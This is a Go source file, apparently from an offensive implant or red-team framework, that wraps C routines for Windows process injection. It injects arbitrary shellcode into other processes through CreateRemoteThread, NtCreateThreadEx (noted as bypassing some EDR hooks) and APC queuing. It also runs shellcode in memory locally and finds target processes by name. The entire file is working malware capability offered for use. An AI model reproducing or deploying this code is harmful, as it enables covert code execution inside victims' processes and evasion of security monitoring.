//go:build windows

// Package inject — Windows implementation.
// Wraps VirtualAllocEx/CreateRemoteThread, NtCreateThreadEx, and APC injection.
package inject

/*
#cgo CFLAGS: -O2
#include "inject_windows.c"
#include <stdlib.h>
*/
import "C"
import (
	"fmt"
	"unsafe"
)

// RemoteThread injects shellcode into pid via VirtualAllocEx + CreateRemoteThread.
func RemoteThread(pid int, shellcode []byte) error {
	cShellcode := C.CBytes(shellcode)
	defer C.free(cShellcode)
	rc := C.aegis_inject_remote_thread(
		C.DWORD(pid),
		(*C.uchar)(cShellcode),
		C.size_t(len(shellcode)),
	)
	if rc != 0 {
		return fmt.Errorf("inject/rt: error %d", rc)
	}
	return nil
}

// NtThread injects via NtCreateThreadEx (bypasses some EDR hooks).
func NtThread(pid int, shellcode []byte) error {
	cShellcode := C.CBytes(shellcode)
	defer C.free(cShellcode)
	rc := C.aegis_inject_nt_thread(
		C.DWORD(pid),
		(*C.uchar)(cShellcode),
		C.size_t(len(shellcode)),
	)
	if rc != 0 {
		return fmt.Errorf("inject/nt: error %d", rc)
	}
	return nil
}

// APC injects via QueueUserAPC into alertable threads of pid.
func APC(pid int, shellcode []byte) error {
	cShellcode := C.CBytes(shellcode)
	defer C.free(cShellcode)
	rc := C.aegis_inject_apc(
		C.DWORD(pid),
		(*C.uchar)(cShellcode),
		C.size_t(len(shellcode)),
	)
	if rc != 0 {
		return fmt.Errorf("inject/apc: error %d", rc)
	}
	return nil
}

// FindPID returns the PID of the first process matching name, or -1.
func FindPID(name string) int {
	cName := C.CString(name)
	defer C.free(unsafe.Pointer(cName))
	pid := C.aegis_find_pid_by_name(cName)
	if pid == 0 {
		return -1
	}
	return int(pid)
}

// RunLocal runs shellcode in the current process's memory (VirtualAlloc + execute).
func RunLocal(shellcode []byte) error {
	cShellcode := C.CBytes(shellcode)
	defer C.free(cShellcode)
	rc := C.aegis_run_local(
		(*C.uchar)(cShellcode),
		C.size_t(len(shellcode)),
	)
	if rc != 0 {
		return fmt.Errorf("inject/local: error %d", rc)
	}
	return nil
}

// InjectByName finds the process by name and injects shellcode.
// Tries NtCreateThreadEx first, falls back to CreateRemoteThread.
func InjectByName(name string, shellcode []byte) error {
	pid := FindPID(name)
	if pid < 0 {
		return fmt.Errorf("inject: process %q not found", name)
	}
	if err := NtThread(pid, shellcode); err != nil {
		return RemoteThread(pid, shellcode)
	}
	return nil
}

// MemfdExec is not available on Windows; use RunLocal instead.
func MemfdExec(shellcode []byte, fakeName string) error {
	return RunLocal(shellcode)
}

// RunShellcode — cross-platform alias.
func RunShellcode(shellcode []byte) error {
	return RunLocal(shellcode)
}

// InjectProcess — cross-platform alias.
func InjectProcess(pid int, shellcode []byte) error {
	return NtThread(pid, shellcode)
}
